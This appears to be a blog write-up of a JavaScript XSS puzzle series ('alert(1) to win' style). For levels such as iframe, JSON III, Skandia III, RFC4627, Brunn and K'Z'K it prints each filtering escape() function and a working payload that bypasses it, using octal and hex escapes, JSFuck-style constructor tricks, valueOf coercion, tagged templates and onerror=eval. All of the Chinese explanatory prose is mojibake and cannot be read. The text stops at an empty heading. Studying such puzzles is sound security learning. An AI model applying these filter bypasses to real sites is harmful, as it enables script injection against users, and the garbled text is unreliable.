<p>è¿™ä¸ªå…³é”®åœ¨äº<code>Function(&quot;code&quot;)</code>ã€‚å®ƒå¯ä»¥å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ è¿›å»ï¼Œè¿”å›ä¸€ä¸ªä»¥ä¼ è¿›å»çš„å­—ç¬¦ä¸²ä¸ºå‡½æ•°ä½“çš„åŒ¿åå‡½æ•°ã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°å¯ä»¥è®©ä½ å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>[][&#x27;sort&#x27;][&#x27;constructor&#x27;]</code>æ¥è·å¾—è¿™ä¸ªå‡½æ•°ã€‚
<img src="/images/3.png" alt=""/>
é¡ºä¾¿ç®€å•è¯´ä¸€ä¸‹ï¼Œ<code>[]</code>å®šä¹‰äº†ä¸€ä¸ªç©ºæ•°ç»„ï¼Œæ•°ç»„è‡ªå¸¦äº†å¾ˆå¤šæ–¹æ³•ï¼Œ<code>sort</code>æ˜¯å…¶ä¸­ä¸€ä¸ªï¼Œè¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œéšä¾¿ç”¨ä¸€ä¸ªéƒ½è¡Œï¼Œè¿™é‡Œå°±ç”¨äº†sortã€‚<code>[][&quot;sort&quot;]</code>çš„æ•ˆæœç›¸å½“äº<code>[].sort</code>ã€‚
æ‰€æœ‰payloadå¯ä»¥æ”¹ä¸º<code>&quot;+[][&quot;sort&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)())+&quot;</code>
æ­¤æ—¶åˆå¤šäº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œç”¨ä»€ä¹ˆæ¥ä»£æ›¿ä¸Šé¢çš„ä¸‰ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Ÿ
è¿™æ—¶å€™å°±å¯ä»¥ç”¨é¢˜ç›®Templateä¸­ç”¨åˆ°çš„æ–¹æ³•äº†ï¼Œç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿å­—æ¯ã€‚
æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ï¼š
solution(99): <code>&quot;+[][&quot;\160\157\160&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&#x27;\141\154\145\162\164(1)&#x27;)()+&quot;</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="iframe">iframe</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">var</span> tag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);

  <span class="hljs-comment">// For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span>
  <span class="hljs-comment">//</span>
  <span class="hljs-comment">// https://4i.am/?...raw=... just outputs whatever you pass in.</span>
  <span class="hljs-comment">//</span>
  <span class="hljs-comment">// Alerting from 4i.am won&#x27;t count.</span>

  s = <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + s + <span class="hljs-string">&#x27;&lt;\/script&gt;&#x27;</span>;
  tag.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(s);

  <span class="hljs-variable language_">window</span>.<span class="hljs-property">WINNING</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) { youWon = <span class="hljs-literal">true</span>; };

  tag.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;onload&#x27;</span>, <span class="hljs-string">&#x27;youWon &amp;&amp; alert(1)&#x27;</span>);
  <span class="hljs-keyword">return</span> tag.<span class="hljs-property">outerHTML</span>;
}
</code></pre>
<p>è¿™é¢˜å…¶å®ä¹ŸæŒºå¥½ç©çš„ï¼Œå¦‚æœæ¯”è¾ƒç†Ÿæ‚‰iframeçš„ç‰¹æ€§çš„è¯ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•å¾ˆå¿«å°±åšå‡ºæ¥äº†ï¼Œä½†æ˜¯å¦‚æœä¸çŸ¥é“çš„è¯ï¼Œé‚£å°±æŒºèŠ±æ—¶é—´çš„äº†ã€‚
è¿™é¢˜å…³é”®åœ¨äºä½¿å¾—<code>youWon</code>è¿™ä¸ªå˜é‡çš„å€¼ä¸ºtrueï¼Œç„¶åå°±å¯ä»¥è§¦å‘alert(1)äº†ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ³¨å…¥çš„åœ°æ–¹æ˜¯ä¸€ä¸ªURLï¼Œé¢˜ç›®æœ‰è¯´ï¼Œè¿™ä¸ªurlé¡µé¢è¿”å›çš„é¡µé¢å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´iframeçš„å†…å®¹æ˜¯ç”±æˆ‘ä»¬å†³å®šçš„ã€‚
æˆ‘ä»¬çš„è¾“å…¥ä¼šåŒ…è£¹åœ¨ä¸€ä¸ª<code>script</code>æ ‡ç­¾é‡Œé¢ã€‚
è¦åšå‡ºè¿™é“é¢˜ï¼Œæˆ‘ä»¬è¦çŸ¥é“ä¸¤ç‚¹iframeçš„ç‰¹æ€§</p>
<ol>
<li>iframeçš„nameå±æ€§å€¼ï¼ŒåŒæ—¶ä¼šæ³¨å…¥åˆ°çˆ¶é¡µé¢çš„å…¨å±€çª—å£å¯¹è±¡ä¸­ã€‚</li>
<li>iframeçš„nameå±æ€§ï¼Œåˆ™iframeçš„window.nameçš„å€¼åŒæ—¶ä¼šè®¾ç½®ä¸ºè¿™ä¸ªnameå±æ€§å€¼ã€‚åè¿‡æ¥ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡æœ‰ä¸ªå‰ææ—¶iframeå¹¶æ²¡æœ‰è®¾ç½®nameå±æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¾ç½®äº†iframeçš„window.nameï¼ŒåŒæ—¶ä¹Ÿä¼šå°†iframeçš„nameå±æ€§å€¼è®¾ç½®ä¸ºåŒæ ·çš„å€¼ï¼ˆå‰ææ˜¯å®ƒä¸å­˜åœ¨çš„è¯ï¼Œä¸èƒ½è¢«è¦†ç›–ï¼‰</li>
</ol>
<p>æ‰€ä»¥ï¼Œç­”æ¡ˆå‡ºæ¥äº†ã€‚
solution(13)ï¼š <code>name=&#x27;youWon&#x27;</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="tism">TI(S)M</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">json</span>(<span class="hljs-params">s</span>) { <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(s).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>); }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">html</span>(<span class="hljs-params">s</span>) { <span class="hljs-keyword">return</span> s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&lt;&gt;&quot;&amp;]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">s</span>) {
                        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&amp;#&#x27;</span> + s.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;;&#x27;</span>; }); }

  <span class="hljs-keyword">return</span> (
    <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> +
      <span class="hljs-string">&#x27;var url = &#x27;</span> + <span class="hljs-title function_">json</span>(s) + <span class="hljs-string">&#x27;; // We\&#x27;ll use this later &#x27;</span> +
    <span class="hljs-string">&#x27;&lt;/script&gt;\n\n&#x27;</span> +
    <span class="hljs-string">&#x27;  &lt;!-- for debugging --&gt;\n&#x27;</span> +
    <span class="hljs-string">&#x27;  URL: &#x27;</span> + <span class="hljs-title function_">html</span>(s) + <span class="hljs-string">&#x27;\n\n&#x27;</span> +
    <span class="hljs-string">&#x27;&lt;!-- then suddenly --&gt;\n&#x27;</span> +
    <span class="hljs-string">&#x27;&lt;script&gt;\n&#x27;</span> +
    <span class="hljs-string">&#x27;  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#x27;</span> +
    <span class="hljs-string">&#x27;  else new Image().src = url;\n&#x27;</span> +
    <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>
  );
}
</code></pre>
<p>è¿™é¢˜æ€è·¯ä¹Ÿæ˜¯ç”±åˆšåˆšé‚£ä¸ªåšä¸»æä¾›çš„ã€‚åŸç†æˆ‘æš‚æ—¶ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨HTML5ä¸­å¦‚æœé‡åˆ°<code>&lt;!--&lt;script&gt;</code>ï¼Œå°±ä¼šè®¤ä¸ºæ¥ä¸‹çš„ä»£ç æ˜¯JSä»£ç ï¼Œç›´åˆ°é‡åˆ°ç»“æŸçš„<code>script</code>æ ‡ç­¾ï¼Œä½†æ˜¯å¿…é¡»å¾—ä¿è¯æœ‰ç›¸åº”çš„<code>-&gt;</code>ï¼Œå¦åˆ™ä¼šè®¤ä¸ºè¯­æ³•å‡ºé”™çš„ã€‚
å…·ä½“çš„å†…å®¹å¯ä»¥åˆ°åˆšåˆšé‚£ä¸ªåšä¸»é‡Œçœ‹å§ï¼Œæˆ‘å°±ç›´æ¥ç»™å‡ºç­”æ¡ˆäº†ã€‚
solution(25): <code>if(alert(1)/*&lt;!--&lt;script&gt;</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="json-â…²">JSON â…¢</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">return</span> s.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;#&#x27;</span>).<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">v</span>) {
      <span class="hljs-comment">// Only 20% of slashes are end tags; save 1.2% of total</span>
      <span class="hljs-comment">// bytes by only escaping those.</span>
      <span class="hljs-keyword">var</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(v).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;\//g</span>, <span class="hljs-string">&#x27;&lt;\\/&#x27;</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span>+json+<span class="hljs-string">&#x27;)&lt;/script&gt;&#x27;</span>;
      }).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);
}
</code></pre>
<p>åˆ©ç”¨ä¸Šä¸€é¢˜çš„åŠæ³•å°±å¯ä»¥åšå‡ºæ¥äº†ã€‚
solution(29): <code>&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</code>
åˆ†æä¸€ä¸‹è¿™ä¸ªç­”æ¡ˆã€‚
è¾“å…¥è¿™ä¸ªç­”æ¡ˆï¼Œä¼šè¾“å…¥å¦‚ä¸‹ç»“æœï¼š</p>
<pre><code class="hljs language-js">&lt;script&gt;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&lt;!--&lt;script&gt;&quot;</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;console.log(&quot;)/</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//--&gt;&quot;)&lt;/script&gt;</span>
</code></pre>
<p>å› ä¸ºæˆ‘ä»¬æ³¨å…¥äº†<code>&lt;!--&lt;script&gt;</code>ï¼Œå¯¼è‡´parserå°†è¿™ä¸€æ®µéƒ½å½“ä½œJSæ¥å¤„ç†ã€‚</p>
<pre><code class="hljs language-js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&lt;!--&lt;script&gt;&quot;</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;console.log(&quot;)/</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//--&gt;&quot;)</span>
</code></pre>
<p>jså¼•æ“ä¼šè§£ææˆå¦‚ä¸‹çš„æ ·å­ï¼š</p>
<pre><code>
console.log(&quot;junk_string&quot;) &lt; /junk_regexp/ ; alert(1) // --&gt;
</code></pre>
<p>å…¶ä¸­
junk_stringä»£è¡¨ï¼š <code>&lt;!--&lt;script&gt;</code>
junk_regexpä»£è¡¨ï¼š <code>script&gt;&lt;script&gt;console.log(&quot;&quot;)</code>
æˆ‘ä»¬çš„solutionä¸­æ³¨å…¥çš„å…¶ä¸­ä¸¤ä¸ªå­—ç¬¦<code>)/</code>å°±ä¸ºäº†æ¬ºéª—JSå¼•æ“ï¼ŒJSå¼•æ“ä¼šå°†ä¸¤ä¸ªæ–œæ ä¹‹é—´çš„å†…å®¹å½“ä½œæ­£åˆ™è¡¨è¾¾å¼å¤„ç†ï¼Œç”¨è¿™ä¸ªåŠæ³•æ¥é—­åˆæ‰è¿™äº›å¤šä½™çš„å­—ç¬¦ã€‚</p>
<br/>
<br/>
<br/>
<br/>
<h1 id="skandia-â…²">Skandia â…¢</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/[\\&lt;&gt;]/</span>.<span class="hljs-title function_">test</span>(s)) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-&#x27;</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.<span class="hljs-title function_">toUpperCase</span>() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™é¢˜å’Œä¸Šä¸€é¢˜<code>Skandia ][</code>å·®ä¸å¤šçš„åšæ³•ã€‚ä¸è¿‡å› ä¸ºè¿‡æ»¤å¤šäº†ä¸€ä¸ªåæ–œæ†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿äº†ã€‚é‚£å°±è¦æ¢ä¸€ç§æ€è·¯ã€‚
å…ˆæ¥çœ‹çœ‹ä¸‹é¢çš„è¡¨æ ¼ã€‚
<img src="/images/1.png" alt=""/>
è¿™é‡Œçš„è¡¨æ ¼æ˜¯è¯´ï¼Œå·¦è¾¹çš„è¾“å…¥æ˜¯å¯ä»¥è¿”å›å³è¾¹çš„å­—ç¬¦ä¸²çš„ã€‚å¤§å®¶å¯ä»¥åœ¨è¯•è¯•ã€‚
æ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•æ¥è·å–æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ä¸²
<img src="/images/2.png" alt=""/>
æ‰€ä»¥æœ€åçš„payload(246):</p>
<pre><code class="hljs language-js"><span class="hljs-string">&quot;+[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+{})[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+{})[5]+(&#x27;&#x27;+{})[1]+(&#x27;&#x27;+{}[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+{})[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+{})[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1] + (&#x27;&#x27;+!1)[2] + (&#x27;&#x27;+!1)[4] +(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&quot;</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;)())//`
</span></code></pre>
<p>å¦‚æœæŠŠæˆ‘ä»¬æ‰€éœ€è¦çš„å­—æ¯éƒ½èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æ›´çŸ­ä¸€äº›</p>
<pre><code class="hljs language-js">_=<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>+!<span class="hljs-number">0</span>+{}[<span class="hljs-number">0</span>]+{}  <span class="hljs-comment">//_=&quot;falsetrueundefined[object Object]&quot;</span>
</code></pre>
<p>æ‰€ä»¥payloadå¯ä»¥ç¼©çŸ­æˆ144ä¸ªå­—ç¬¦ï¼š</p>
<pre><code class="hljs language-js"><span class="hljs-string">&quot;);_=&#x27;&#x27;+!1+!0+{}[0]+{};[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+&#x27;(1)&#x27;)()//
</span></code></pre>
<br/>
<br/>
<br/>
<br/>
<h1 id="rfc4627">RFC4627</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">text</span>) {
  <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">the_easy_but_expensive_way_out</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) { <span class="hljs-title function_">alert</span>(i++) };

<span class="hljs-comment">// &quot;A JSON text can be safely passed into JavaScript&#x27;s eval() function</span>
<span class="hljs-comment">// (which compiles and executes a string) if all the characters not</span>
<span class="hljs-comment">// enclosed in strings are in the set of characters that form JSON</span>
<span class="hljs-comment">// tokens.&quot;</span>

  <span class="hljs-keyword">if</span> (!(<span class="hljs-regexp">/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.<span class="hljs-title function_">test</span>(
          text.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&quot;(\\.|[^&quot;\\])*&quot;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>)))) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">var</span> val = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;(&#x27;</span> + text + <span class="hljs-string">&#x27;)&#x27;</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;&#x27;</span> + val);
    } <span class="hljs-keyword">catch</span> (_) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Crashed: &#x27;</span>+_);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Rejected.&#x27;</span>);
  }
}
</code></pre>
<p>æ®è¯´è¿™é¢˜æ˜¯åŸºäºçœŸå®çš„æ¡ˆä¾‹ï¼Œ<a href="https://twitter.com/WisecWisec">Stefano Di Paola</a>è®°è½½åœ¨è¿™ç¯‡<a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">æ–‡ç« </a>ä¸­ã€‚
ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒæ˜¯å…è®¸æˆ‘ä»¬è¾“å…¥<code>self</code>çš„ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å®ƒæ¥è°ƒç”¨å…¨å±€å‡½æ•°<code>the_easy_but_expensive_way_out</code>äº†ã€‚
è¿™é¢˜çš„æŠ€å·§å°±æ˜¯è®©ä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªå€¼æˆ–è€…ä¸€ä¸ªå­—ç¬¦ç›¸åŠ ã€‚è¿™æ ·JSå¼•æ“å°±ä¼šå»è®¡ç®—æˆ‘ä»¬çš„å¯¹è±¡çš„å€¼ï¼Œæ€ä¹ˆè®¡ç®—å‘¢ï¼Ÿå°±æ˜¯è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„<code>valueOf</code>æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬å°†valueOfæ–¹æ³•å®šä¹‰ä¸ºé¢˜ç›®ä¸­çš„<code>the_easy_but_expenssive_way_out</code>ï¼Œï¼Œå°±å¯ä»¥è§¦å‘alertå‡½æ•°äº†ï¼Œä½†æ˜¯ç”±äºæ˜¯alert(i++)ï¼Œiä»0å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è°ƒç”¨ä¸¤æ¬¡ã€‚
solution(103): <code>{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}+0,{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}</code>
éœ€è¦æé†’çš„æ˜¯ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”±<code>eval</code>è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡æ˜¯ç”±<code>console.log</code>è°ƒç”¨ã€‚</p>
<br/>
<br/>
<br/>
<br/>
<h1 id="brunn">Brunn</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-attr">http</span>:<span class="hljs-comment">//www.avlidienbrunn.se/xsschallenge/</span>

  s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[\r\n\u2028\u2029\\;,()\[\]&lt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt; var email = &#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;; &lt;\/script&gt;&quot;</span>;
}
</code></pre>
<p>åˆ†å·å°–æ‹¬å·éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥æ™®é€šçš„åŠæ³•æ˜¯æ— æ•ˆçš„ã€‚ä½†æ˜¯ä¸Šä¸€é¢˜çš„æ–¹æ³•è¿˜æ˜¯æœ‰ç”¨ã€‚
æ‰€ä»¥åº”è¯¥æ„é€ çš„payloadæ˜¯ï¼š
<code>&#x27;+{valueOf:Function(&#x27;alert(1)&#x27;)}//</code>
æˆ–è€…<code>&#x27;+{valueOf:function(){alert(1)}}//</code>
æˆ–è€…<code>&#x27;+{valueOf:()=&gt;{alert(1)}}//</code>
æˆ–è€…<code>&#x27;+{valueOf:a=&gt;{alert(1)}}//</code>
ä½†æ˜¯æœ‰æ–°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸èƒ½ä½¿ç”¨å°æ‹¬å·å’Œä¸­æ‹¬å·ã€‚
å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ç”¨<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_template_literals">Tag Function</a>æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚
solution(85):</p>
<pre><code class="hljs language-js"><span class="hljs-string">&#x27;+{valueOf:Function`a${&#x27;</span>alert<span class="hljs-string">&#x27;+String.fromCharCode`40`+1+String.fromCharCode`41`}`}//
</span></code></pre>
<br/>
<br/>
<br/>
<br/>
<h1 id="no">No</h1>
<pre><code class="hljs language-js"><span class="hljs-comment">// submitted by Stephen Leppik</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
    s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[()`&lt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// no function calls</span>

    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;\n&#x27;</span> +
           <span class="hljs-string">&#x27;var string = &quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;;\n&#x27;</span> +
           <span class="hljs-string">&#x27;console.log(string);\n&#x27;</span> +
           <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>å‚è€ƒèµ„æ–™ï¼š<a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/">XSS technique without parentheses</a>
solution(39): <code>&quot;;onerror=eval;throw&#x27;=alert\x281\x29&#x27;//</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="kzk">K&#x27;Z&#x27;K</h1>
<pre><code class="hljs language-js"><span class="hljs-comment">// submitted by Stephen Leppik</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-comment">// remove vowels in honor of K&#x27;Z&#x27;K the Destroyer</span>
    s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[aeiouy]/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™ä¸ªé¢˜è¦ç”¨çš„åŠæ³•è¿˜æ˜¯å’Œé¢˜ç›®ä¸€æ ·Skandia ][]ï¼Œä½†æ˜¯ä¸ç”¨å…¨éƒ¨éƒ½ç”¨å…«è¿›åˆ¶æ¥æ›¿æ¢ï¼Œåªè¦æ›¿æ¢æ‰å…ƒéŸ³å­—æ¯å°±å¯ä»¥äº†ã€‚
solution(60):  <code>&quot;,[][&quot;p\x6fp&quot;][&quot;c\x6fnstr\x75ct\x6fr&quot;](&#x27;\x61l\x65rt(1)&#x27;)(),&quot;</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="kzk-1">K&#x27;Z&#x27;K</h1>
<pre><code class="hljs language-js"><span class="hljs-comment">// submitted by Stephen Leppik</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-comment">// remove vowels and escape sequences in honor of K&#x27;Z&#x27;K</span>
    <span class="hljs-comment">// y is only sometimes a vowel, so it&#x27;s only removed as a literal</span>
    s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>)
    <span class="hljs-comment">// remove certain characters that can be used to get vowels</span>
    s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[{}!=&lt;&gt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™é¢˜æœ‰ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œå°†æˆ‘ä»¬çš„å…«è¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶éƒ½ç»™æ›¿æ¢æˆç©ºäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šä¸€é¢˜çš„åšæ³•å’Œé¢˜ç›®JSON ][çš„æ–¹æ³•å°±å¯ä»¥äº†ã€‚
solution(85): <code>&quot;);[][&quot;p\x\x6f6fp&quot;][&quot;c\x\x6f6fnstr\x\x7575ct\x\x6f6fr&quot;](&#x27;\x\x6161l\x\x6565rt(1)&#x27;)()//</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="kzk-2">K&#x27;Z&#x27;K</h1>
<pre><code class="hljs language-js"><span class="hljs-comment">// submitted by Stephen Leppik</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-comment">// remove vowels in honor of K&#x27;Z&#x27;K the Destroyer</span>
    s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[aeiouy]/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);
    <span class="hljs-comment">// remove certain characters that can be used to get vowels</span>
    s = s.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[{}!=&lt;&gt;\\]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;
}
</code></pre>
<p>è¿™é¢˜å¤æ‚ä¸€ç‚¹ï¼Œæ²¡æƒ³åˆ°å¥½åŠæ³•ã€‚æ‰€ä»¥è¿˜æ˜¯ç”¨è€åŠæ³•ã€‚
solution(190):</p>
<pre><code class="hljs language-js"><span class="hljs-string">&quot;);[][&#x27;m&#x27;+(++[][[]]+[])[1]+&#x27;p&#x27;][&#x27;c&#x27;+([][&#x27;m&#x27;+(++[][[]]+[])[1]+&#x27;p&#x27;]+[])[6]+&#x27;nstr&#x27;+([][[]]+[])[0]+&#x27;ct&#x27;+([][&#x27;m&#x27;+(++[][[]]+[])[1]+&#x27;p&#x27;]+[])[6]+&#x27;r&#x27;]((++[][[]]+[])[1]+&#x27;l&#x27;+([][[]]+[])[3]+&#x27;rt(1)&#x27;)()//
</span></code></pre>
<br/>
<br/>
<br/>
<br/>
<h1 id="fruit-1">Fruit 1</h1>
